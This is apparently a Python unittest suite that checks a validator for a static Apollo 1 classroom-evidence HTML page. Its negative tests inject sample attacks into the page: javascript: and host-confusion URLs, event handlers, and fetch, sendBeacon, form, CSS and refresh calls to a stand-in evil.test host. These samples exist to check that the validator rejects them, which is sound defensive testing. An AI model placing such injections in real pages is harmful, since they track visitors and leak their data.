"""R117 source-boundary negative controls. Offline only: does not qualify NASA rights or browser acceptance."""
import unittest
from qa_r117_delivery_boundary import validate, safe_url, DeliveryBoundaryError

FIX = '''<!doctype html><html><head><style>@media print{body{color:#111}}</style></head>
<body><h1>S67-19766 (provisional)</h1><p>0/6 photo rights cleared</p>
<a data-fv-primary-cta href="#classroom-preview">Free classroom evidence</a>
<a href="https://www.nasa.gov/image-detail/amf-s67-15717/">Source</a>
<a href="https://www.nasa.gov/image-detail/amf-s66-58038/">Source</a>
<a href="https://www.nasa.gov/image-detail/amf-s67-21294/">Source</a>
<a href="https://www.nasa.gov/apollo-1-resources/">Source</a>
<a href="https://sma.nasa.gov/sma-disciplines/accllp/apollo-1">Review</a>
<a href="https://finalvestige.com/2026/08/20/the-hatch-opened-inward-apollo-1/">Article</a>
<a href="#sources">Sources</a><a href="#classroom-preview">Exercise</a>
<script>(function(){var lens=document.querySelector('[data-fv-lens]'),plates=document.querySelectorAll('[data-fv-claim]');})();</script>
</body></html>'''

class BoundaryTests(unittest.TestCase):
    def blocked(self, needle, replacement):
        self.assertIn(needle, FIX)
        with self.assertRaises(DeliveryBoundaryError):
            validate(FIX.replace(needle, replacement, 1))

    def test_01_fixture_passes_without_browser_claim(self):
        r = validate(FIX)
        self.assertEqual(r["release"], "STAGING_HOLD")
        self.assertEqual(r["external_scripts_images_forms"], 0)
    def test_02_good_urls(self):
        self.assertTrue(safe_url("https://www.nasa.gov/image-detail/amf-s66-58038/"))
        self.assertTrue(safe_url("#classroom-preview"))
    def test_03_host_confusion(self):
        for u in ["https://www.nasa.gov.evil.test/a", "https://evil.test/a",
                  "https://www.nasa.gov@evil.test/a", "https://www.nasa.gov:8443/a",
                  "javascript:alert(1)", "data:text/html,x", "http://www.nasa.gov/a",
                  "//www.nasa.gov/a", "https://www.nasa.gov/a?sid=visitor",
                  "https://www.nasa.gov/a#ext", " #classroom-preview", "#"]:
            with self.subTest(url=u):
                self.assertFalse(safe_url(u))
    def test_04_event_handler(self): self.blocked("<h1", '<h1 onclick="alert(1)"')
    def test_05_external_script(self): self.blocked("<script>", '<script src="https://evil.test/analytics.js">')
    def test_06_css_import(self): self.blocked("@media print", "@import url(https://evil.test/a.css); @media print")
    def test_07_css_beacon(self): self.blocked("body{color:#111}", "body{background:url(https://evil.test/px)}")
    def test_08_storage(self): self.blocked("var lens", 'localStorage.setItem("visitor","1"); var lens')
    def test_09_fetch(self): self.blocked("var lens", 'fetch("https://evil.test/collect"); var lens')
    def test_10_xhr(self): self.blocked("var lens", "new XMLHttpRequest(); var lens")
    def test_11_beacon(self): self.blocked("var lens", 'navigator.sendBeacon("https://evil.test",1); var lens')
    def test_12_html_injection(self): self.blocked("var lens", 'document.body.innerHTML="ad"; var lens')
    def test_13_media(self): self.blocked("</body>", '<img src="https://www.nasa.gov/photo.jpg"></body>')
    def test_14_capture(self): self.blocked("</body>", '<form action="https://evil.test/"><input></form></body>')
    def test_15_checkout(self): self.blocked("</body>", '<a href="https://payhip.com/b/xyz">Buy</a></body>')
    def test_16_second_cta(self): self.blocked("</body>", '<a data-fv-primary-cta href="#classroom-preview">More</a></body>')
    def test_17_refresh(self): self.blocked("<head>", '<head><meta http-equiv="refresh" content="0;url=https://evil.test">')
    def test_18_tracking_link(self): self.blocked("https://finalvestige.com/2026", "https://tracking.test/2026")
    def test_19_misleading_catalog(self): self.blocked("S67-19766 (provisional)", "S67-19766 (confirmed)")
    def test_20_missing_inline(self): self.blocked("<script>", "<!--<script>")
    def test_21_duplicate_attribute(self): self.blocked('<a data-fv-primary-cta href=', '<a href="#evil" data-fv-primary-cta href=')
    def test_22_ping(self): self.blocked('href="#sources"', 'href="#sources" ping="https://evil.test"')

if __name__ == "__main__":
    unittest.main()
